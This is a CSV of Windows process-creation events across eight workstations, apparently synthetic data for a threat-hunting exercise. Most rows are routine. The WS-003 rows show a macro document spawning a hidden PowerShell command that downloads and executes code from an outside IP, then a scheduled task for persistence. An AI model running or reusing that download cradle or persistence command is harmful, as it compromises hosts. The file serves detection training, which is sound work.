timestamp,host,user,parent,process,cmdline
2026-09-16T09:00:00Z,WS-002,SYSTEM,services.exe,svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p"
2026-09-16T09:00:00Z,WS-003,SYSTEM,services.exe,svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p"
2026-09-16T09:00:00Z,WS-004,SYSTEM,services.exe,svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p"
2026-09-16T09:00:00Z,WS-005,SYSTEM,services.exe,svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p"
2026-09-16T09:00:00Z,WS-006,SYSTEM,services.exe,svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p"
2026-09-16T09:00:00Z,WS-007,SYSTEM,services.exe,svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p"
2026-09-16T09:00:00Z,WS-008,SYSTEM,services.exe,svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p"
2026-09-16T10:15:00Z,WS-001,SYSTEM,services.exe,backupagent.exe,"C:\Program Files\BackupCo\backupagent.exe --run"
2026-09-16T10:15:00Z,WS-002,SYSTEM,services.exe,backupagent.exe,"C:\Program Files\BackupCo\backupagent.exe --run"
2026-09-16T10:15:00Z,WS-003,SYSTEM,services.exe,backupagent.exe,"C:\Program Files\BackupCo\backupagent.exe --run"
2026-09-16T10:15:00Z,WS-004,SYSTEM,services.exe,backupagent.exe,"C:\Program Files\BackupCo\backupagent.exe --run"
2026-09-16T10:15:00Z,WS-005,SYSTEM,services.exe,backupagent.exe,"C:\Program Files\BackupCo\backupagent.exe --run"
2026-09-16T10:15:00Z,WS-006,SYSTEM,services.exe,backupagent.exe,"C:\Program Files\BackupCo\backupagent.exe --run"
2026-09-16T11:22:07Z,WS-003,carol,outlook.exe,winword.exe,"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /n ""C:\Users\carol\AppData\Local\Temp\invoice_0917.docm"""
2026-09-16T11:22:19Z,WS-003,carol,winword.exe,cmd.exe,"cmd.exe /c powershell -w hidden -nop -c ""iex (new-object net.webclient).downloadstring('http://198.51.100.23/a')"""
2026-09-16T11:22:20Z,WS-003,carol,cmd.exe,powershell.exe,"powershell -w hidden -nop -c ""iex (new-object net.webclient).downloadstring('http://198.51.100.23/a')"""
2026-09-16T11:23:02Z,WS-003,carol,powershell.exe,schtasks.exe,"schtasks /create /tn Updater /tr C:\Users\carol\AppData\Local\Temp\upd.exe /sc minute /mo 15"
2026-09-16T12:00:05Z,WS-005,erin,explorer.exe,powershell.exe,"powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\report.ps1"
2026-09-16T13:45:30Z,WS-008,heidi,explorer.exe,7zfm.exe,"C:\Program Files\7-Zip\7zFM.exe"
2026-09-16T14:10:10Z,WS-002,bob,chrome.exe,chrome.exe,"C:\Program Files\Google\Chrome\Application\chrome.exe --type=renderer"
2026-09-16T14:10:11Z,WS-004,dave,chrome.exe,chrome.exe,"C:\Program Files\Google\Chrome\Application\chrome.exe --type=renderer"
2026-09-16T15:30:00Z,WS-007,grace,explorer.exe,anydesk.exe,"C:\Users\grace\Downloads\AnyDesk.exe"
2026-09-16T16:00:00Z,WS-001,alice,explorer.exe,excel.exe,"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
